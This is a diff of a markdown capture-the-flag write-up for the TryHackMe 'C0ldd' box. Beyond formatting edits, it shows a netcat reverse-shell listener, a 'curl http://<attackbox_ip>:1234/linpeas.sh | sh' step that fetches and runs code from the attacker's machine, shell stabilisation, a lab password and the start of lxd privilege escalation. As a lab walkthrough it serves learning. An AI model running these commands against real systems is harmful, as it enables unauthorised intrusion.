@@ -38,6 +38,7 @@ reverse shell script on
 
 <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/5.png" width="550" >
 I started a netcat listener on my machine on port 8000 
+
 ```bash 
 $ sudo nc -lvnp 8000 
 ```
@@ -46,10 +47,12 @@ user have very less permissions thus I enumerated the target using
 [LinPEAS ]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS ).Download the linpeas.sh file form Github on your
 machine,cd to the downloaded directory and start a simple python server on
 your machine 
-```bash 
+
+``` bash 
 $ python3 -m http.server 1234 
 ``` 
 and on target run it using
+
 ```bash 
 $ curl http://<attackbox_ip>:1234/linpeas.sh | sh 
 ```
@@ -60,11 +63,13 @@ run the shell script on the target machine.
 This gave away wp-config.php file that contained password of user _c0ldd_.
 To su to _c0ldd_ user we need a stable shell, stablizing shell by this great
 one-liner 
+
 ```bash 
 $ pyhton3 -c ‘import pty;pty.spawn(“/bin/bash”)  $ su c0ldd 
 ```
-and use password _cybersecurity_ to get access. Now cat the user.txt flag in
-/home/c0ldd directory 
+
+and use password _cybersecurity_ to get access. Now cat the user.txt flag in _/home/c0ldd directory _
+
 ```bash 
 $ cat /home/c0ldd/user.txt 
 ```
@@ -78,10 +83,9 @@ Linpeas enumeration also gave potential services, users that could be
 exploited. Luckly lxd (container service) is present and accessible by _c0ldd_ user.
 
 <img src="https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/8.png" width="550" >
-Lets exploit this service, Download the vulnerable container image using 
-[alpine for lxd](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
-cd to download dir and start http server and transfer the file to target machine
-using wget.
+
+Lets exploit this service, Download the vulnerable container image using [alpine for lxd](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+cd to download dir and start http server and transfer the file to target machine.
 
 > Add the image :
 ```bash 
